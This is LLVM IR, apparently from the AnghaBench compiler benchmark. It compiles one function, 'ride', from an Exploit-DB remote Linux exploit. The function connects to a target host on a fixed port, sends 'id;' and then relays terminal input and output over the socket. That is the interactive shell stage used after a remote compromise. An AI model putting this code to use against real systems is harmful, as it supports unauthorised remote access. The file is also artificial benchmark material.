; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_21242.c_ride.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_21242.c_ride.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.sockaddr_in = type { i32 }
%struct.sockaddr = type { i32 }

@s_in = common dso_local global i32 0, align 4
@PF_INET = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@IPPROTO_TCP = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [9 x i8] c"socket()\00", align 1
@.str.1 = private unnamed_addr constant [5 x i8] c"id;\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @ride() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca %struct.sockaddr_in, align 4
  %5 = alloca [1024 x i8], align 16
  %6 = call i32 @memcpy(%struct.sockaddr_in* %4, i32* @s_in, i32 4)
  %7 = call i32 @htons(i32 30464)
  %8 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %4, i32 0, i32 0
  store i32 %7, i32* %8, align 4
  %9 = load i32, i32* @PF_INET, align 4
  %10 = load i32, i32* @SOCK_STREAM, align 4
  %11 = load i32, i32* @IPPROTO_TCP, align 4
  %12 = call i32 @socket(i32 %9, i32 %10, i32 %11)
  store i32 %12, i32* %3, align 4
  %13 = load i32, i32* %3, align 4
  %14 = icmp slt i32 %13, 0
  br i1 %14, label %15, label %17

15:                                               ; preds = %0
  %16 = call i32 @die(i32 1, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str, i64 0, i64 0))
  br label %17

17:                                               ; preds = %15, %0
  %18 = load i32, i32* %3, align 4
  %19 = bitcast %struct.sockaddr_in* %4 to %struct.sockaddr*
  %20 = call i64 @connect(i32 %18, %struct.sockaddr* %19, i32 4)
  %21 = icmp slt i64 %20, 0
  br i1 %21, label %22, label %25

22:                                               ; preds = %17
  %23 = load i32, i32* %3, align 4
  %24 = call i32 @close(i32 %23)
  ret void

25:                                               ; preds = %17
  %26 = load i32, i32* %3, align 4
  %27 = call i32 @send(i32 %26, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.1, i64 0, i64 0), i32 4, i32 0)
  br label %28

28:                                               ; preds = %25, %73
  %29 = call i32 @FD_ZERO(i32* %1)
  %30 = call i32 @FD_SET(i32 0, i32* %1)
  %31 = load i32, i32* %3, align 4
  %32 = call i32 @FD_SET(i32 %31, i32* %1)
  %33 = load i32, i32* %3, align 4
  %34 = add nsw i32 %33, 1
  %35 = call i32 @select(i32 %34, i32* %1, i32* null, i32* null, i32* null)
  %36 = icmp slt i32 %35, 1
  br i1 %36, label %37, label %39

37:                                               ; preds = %28
  %38 = call i32 @exit(i32 0) #3
  unreachable

39:                                               ; preds = %28
  %40 = call i64 @FD_ISSET(i32 0, i32* %1)
  %41 = icmp ne i64 %40, 0
  br i1 %41, label %42, label %58

42:                                               ; preds = %39
  %43 = getelementptr inbounds [1024 x i8], [1024 x i8]* %5, i64 0, i64 0
  %44 = call i32 @read(i32 0, i8* %43, i32 1024)
  store i32 %44, i32* %2, align 4
  %45 = icmp slt i32 %44, 1
  br i1 %45, label %46, label %48

46:                                               ; preds = %42
  %47 = call i32 @exit(i32 0) #3
  unreachable

48:                                               ; preds = %42
  %49 = load i32, i32* %3, align 4
  %50 = getelementptr inbounds [1024 x i8], [1024 x i8]* %5, i64 0, i64 0
  %51 = load i32, i32* %2, align 4
  %52 = call i32 @send(i32 %49, i8* %50, i32 %51, i32 0)
  %53 = load i32, i32* %2, align 4
  %54 = icmp ne i32 %52, %53
  br i1 %54, label %55, label %57

55:                                               ; preds = %48
  %56 = call i32 @exit(i32 0) #3
  unreachable

57:                                               ; preds = %48
  br label %58

58:                                               ; preds = %57, %39
  %59 = load i32, i32* %3, align 4
  %60 = call i64 @FD_ISSET(i32 %59, i32* %1)
  %61 = icmp ne i64 %60, 0
  br i1 %61, label %62, label %73

62:                                               ; preds = %58
  %63 = load i32, i32* %3, align 4
  %64 = getelementptr inbounds [1024 x i8], [1024 x i8]* %5, i64 0, i64 0
  %65 = call i32 @recv(i32 %63, i8* %64, i32 1024, i32 0)
  store i32 %65, i32* %2, align 4
  %66 = icmp slt i32 %65, 1
  br i1 %66, label %67, label %69

67:                                               ; preds = %62
  %68 = call i32 @exit(i32 0) #3
  unreachable

69:                                               ; preds = %62
  %70 = getelementptr inbounds [1024 x i8], [1024 x i8]* %5, i64 0, i64 0
  %71 = load i32, i32* %2, align 4
  %72 = call i32 @write(i32 1, i8* %70, i32 %71)
  br label %73

73:                                               ; preds = %69, %58
  br label %28
}

declare dso_local i32 @memcpy(%struct.sockaddr_in*, i32*, i32) #1

declare dso_local i32 @htons(i32) #1

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i32 @die(i32, i8*) #1

declare dso_local i64 @connect(i32, %struct.sockaddr*, i32) #1

declare dso_local i32 @close(i32) #1

declare dso_local i32 @send(i32, i8*, i32, i32) #1

declare dso_local i32 @FD_ZERO(i32*) #1

declare dso_local i32 @FD_SET(i32, i32*) #1

declare dso_local i32 @select(i32, i32*, i32*, i32*, i32*) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i64 @FD_ISSET(i32, i32*) #1

declare dso_local i32 @read(i32, i8*, i32) #1

declare dso_local i32 @recv(i32, i8*, i32, i32) #1

declare dso_local i32 @write(i32, i8*, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
